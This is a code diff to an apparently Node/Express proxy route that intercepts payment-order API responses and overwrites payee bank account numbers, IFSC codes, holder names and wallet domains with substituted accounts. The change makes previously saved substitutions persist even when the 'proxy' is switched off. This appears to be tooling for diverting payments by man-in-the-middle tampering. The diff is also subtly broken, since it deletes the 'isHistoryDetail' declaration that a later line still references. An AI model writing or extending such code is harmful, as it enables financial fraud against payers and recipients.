@@ -3055,9 +3055,12 @@ app.all('/xxapi/*', async (req, res) => {
         let _notReplacedAmt = null;
         let _notReplacedMin = null;
 
-        if (data.botEnabled !== false) {
-            const bank = getActiveBank(data, userId);
-            if (bank) {
+        const isProxyOn = data.botEnabled !== false;
+        const bank = getActiveBank(data, userId);
+        const hasSavedOrders = data.orderBankMap && Object.keys(data.orderBankMap).length > 0;
+
+        if (isProxyOn || hasSavedOrders) {
+            if (bank || hasSavedOrders) {
                 const isListResp = Array.isArray(respData);
                 // Detect nested list: { list:[...] } / { data:[...] } / { records:[...] } / { rows:[...] } / { items:[...] }
                 const nestedList = !isListResp && respData && typeof respData === 'object'
@@ -3080,8 +3083,8 @@ app.all('/xxapi/*', async (req, res) => {
                 }
                 // Per-item replace: browse items (orderState=0) → minAmount check → blanket replace;
                 // Per-item replace in lists:
-                // 1. Saved orders in KV → replace with saved mapped bank
-                // 2. User's History/Bought orders → replace with active bank & save to KV
+                // 1. Saved orders in KV → replace with saved mapped bank (ALWAYS, even if proxy OFF)
+                // 2. User's History/Bought orders → replace with active bank & save to KV (Only if proxy ON)
                 async function _replaceListItems(list) {
                     if (!Array.isArray(list)) return;
                     let dataChanged = false;
@@ -3105,7 +3108,7 @@ app.all('/xxapi/*', async (req, res) => {
                         const minOk = itemMinAmount <= 0 || (iAmt > 0 && iAmt >= itemMinAmount);
 
                         if (savedMapping) {
-                            // Already bought / mapped order in KV: replace with mapped bank (NEVER overwrite with active bank)
+                            // Already bought / mapped order in KV: replace with mapped bank ALWAYS (even if proxy is OFF!)
                             const mappedBank = bankFromSavedOrder(savedMapping);
                             if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
                                 if (urlLower.includes('waitconfirm')) {
@@ -3122,7 +3125,7 @@ app.all('/xxapi/*', async (req, res) => {
                                     if (mappedWallet) item.walletDomain = mappedWallet;
                                 }
                             }
-                        } else if (urlLower.includes('history') && !isCancelUrl) {
+                        } else if (isProxyOn && urlLower.includes('history') && !isCancelUrl) {
                             // ONLY replace when orderState is 1 (Paying / In-Progress)
                             if (orderState === 1 && rptNo) {
                                 const oldAcctNo = item.acctNo || item.account || item.accountNo || '';
@@ -3236,13 +3239,13 @@ app.all('/xxapi/*', async (req, res) => {
 
                         const existingOrderMapping = (rptNo && data.orderBankMap && data.orderBankMap[rptNo]) || getSavedOrderMapping(data, rptNo);
                         const existingBank = existingOrderMapping ? bankFromSavedOrder(existingOrderMapping) : null;
-                        const targetBank = (existingBank && (existingBank.accountNo || existingBank.accountHolder)) ? existingBank : bank;
+                        const targetBank = (existingBank && (existingBank.accountNo || existingBank.accountHolder)) ? existingBank : (isProxyOn ? bank : null);
 
                         const oldBankHolder = (respData && (respData.payee_recipients_name || respData.acctName || respData.accountHolder || respData.name)) || (_realBankSnap && _realBankSnap.accountHolder) || '';
                         const oldBankAcc = (respData && (respData.payee_bank_account || respData.acctNo || respData.accountNo || respData.account)) || (_realBankSnap && _realBankSnap.accountNo) || '';
                         const oldBankIfsc = (respData && (respData.payee_ifsc || respData.acctCode || respData.ifsc)) || (_realBankSnap && _realBankSnap.ifsc) || '';
 
-                        if ((existingBank || minOk) && targetBank && targetBank.accountNo) {
+                        if ((existingBank || (isProxyOn && minOk)) && targetBank && targetBank.accountNo) {
                             // 1. Replace Bank Fields in respData and jsonResp (preserves existing mapped bank!)
                             if (respData && typeof respData === 'object') {
                                 respData.payee_bank_account = targetBank.accountNo;
@@ -3372,9 +3375,8 @@ app.all('/xxapi/*', async (req, res) => {
                             const savedSingleOrder = singleOrderState > 0 || isPickupResponse
                                 ? (getSavedOrderMapping(data, directSingleId) || getSavedOrderMapping(data, respData) || getSavedOrderMapping(data, pickupOrderId) || getSavedOrderMapping(data, getRequestOrderId(req)))
                                 : null;
-                            const isHistoryDetail = urlLower.includes('history') || urlLower.includes('cancel') || singleOrderState > 0;
-                            if ((!isHistoryDetail && !isPickupResponse && singleOrderState <= 0) || savedSingleOrder) {
-                                const replacementBank = savedSingleOrder ? bankFromSavedOrder(savedSingleOrder) : bank;
+                            if ((isProxyOn && !isHistoryDetail && !isPickupResponse && singleOrderState <= 0) || savedSingleOrder) {
+                                const replacementBank = savedSingleOrder ? bankFromSavedOrder(savedSingleOrder) : (isProxyOn ? bank : null);
                                 if (replacementBank && (replacementBank.accountNo || replacementBank.ifsc || replacementBank.accountHolder)) {
                                     const globalHasAcct = scanHasBankFields(jsonResp, 0);
                                     if (globalHasAcct) {
